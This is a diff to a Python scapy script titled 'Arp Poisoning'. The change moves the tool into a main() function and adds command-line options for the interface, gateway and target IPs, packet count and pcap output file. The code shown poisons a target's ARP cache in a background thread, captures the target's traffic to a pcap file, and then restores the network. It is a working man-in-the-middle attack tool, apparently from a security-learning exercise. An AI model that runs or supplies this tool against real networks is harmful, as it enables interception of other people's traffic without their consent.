@@ -1,11 +1,13 @@
 #!/usr/bin/env python
 """Arp Poisoning."""
 from scapy.all import *
+from scapy.all import ARP, send, sniff, srp, Ether, conf, wrpcap
 import os
 import sys
 import threading
 import signal
 import time
+import argparse
 
 interface = "wlp2s0"
 target_ip = "192.168.2.101"
@@ -76,40 +78,94 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     return
 
 
-# set our interface
-conf.iface = interface
-# turn off output
-conf.verb = 0
-print(f"[*] Setting up {interface}")
-gateway_mac = get_mac(gateway_ip)
+def main(interface, gateway_ip, target_ip, packet_count, pcap_file):
+    # set our interface
+    conf.iface = interface
+    # turn off output
+    conf.verb = 0
+    print(f"[*] Setting up {interface}")
+    gateway_mac = get_mac(gateway_ip)
 
-if gateway_mac is None:
-    print("[!] Failed to get gateway {gateway_ip}  MAC. Exiting..")
-    sys.exit(0)
-else:
-    print(f"[*] Gateway {gateway_ip} at {gateway_mac}")
-target_mac = get_mac(target_ip)
-if target_mac is None:
-    print(f"[!] Failed to get target {target_ip} MAC. Exiting..")
-    sys.exit(0)
-else:
-    print(f"[*] Target {target_ip} at {target_mac}")
+    if gateway_mac is None:
+        print("[!] Failed to get gateway {gateway_ip}  MAC. Exiting..")
+        sys.exit(0)
+    else:
+        print(f"[*] Gateway {gateway_ip} at {gateway_mac}")
+    target_mac = get_mac(target_ip)
+    if target_mac is None:
+        print(f"[!] Failed to get target {target_ip} MAC. Exiting..")
+        sys.exit(0)
+    else:
+        print(f"[*] Target {target_ip} at {target_mac}")
 
-# start poison thread
-poison_thread = threading.Thread(
-    target=poison_target,
-    args=(gateway_ip, gateway_mac, target_ip, target_mac),
-)
-poison_thread.start()
-try:
-    print(f"[*] Starting sniffer for {packet_count} packets..")
-    bpf_filter = f"ip host {target_ip}"
-    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
-    # write out the captured packets
-    wrpcap("arper.pcap", packets)
-    # restore the network
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-except KeyboardInterrupt:
-    # restore the network
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-    sys.exit(0)
+    # start poison thread
+    poison_thread = threading.Thread(
+        target=poison_target,
+        args=(gateway_ip, gateway_mac, target_ip, target_mac),
+    )
+    poison_thread.start()
+    try:
+        print(f"[*] Starting sniffer for {packet_count} packets..")
+        bpf_filter = f"ip host {target_ip}"
+        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
+        # write out the captured packets
+        wrpcap(pcap_file, packets)
+        # restore the network
+        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    except KeyboardInterrupt:
+        # restore the network
+        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+        sys.exit(0)
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "-i",
+        "--interface",
+        action="store",
+        dest="interface",
+        default="wlp2s0",
+        help="Interface to Capture On",
+    )
+    parser.add_argument(
+        "-g",
+        "--gateway-ip",
+        action="store",
+        dest="gateway_ip",
+        default="192.168.2.1",
+        help="Gateway IP address",
+    )
+    parser.add_argument(
+        "-t",
+        "--target-ip",
+        action="store",
+        dest="target_ip",
+        default="192.168.2.102",
+        help="Target IP address",
+    )
+    parser.add_argument(
+        "-p",
+        "--pcap-file",
+        action="store",
+        dest="pcap_file",
+        default="arper.pcap",
+        help="Packet Capture Filename",
+    )
+    parser.add_argument(
+        "-n",
+        "--packet-count",
+        action="store",
+        dest="packet_count",
+        default=1000,
+        help="Number of Packets to Capture",
+        type=int,
+    )
+    args = parser.parse_args()
+    main(
+        args.interface,
+        args.gateway_ip,
+        args.target_ip,
+        args.packet_count,
+        args.pcap_file,
+    )
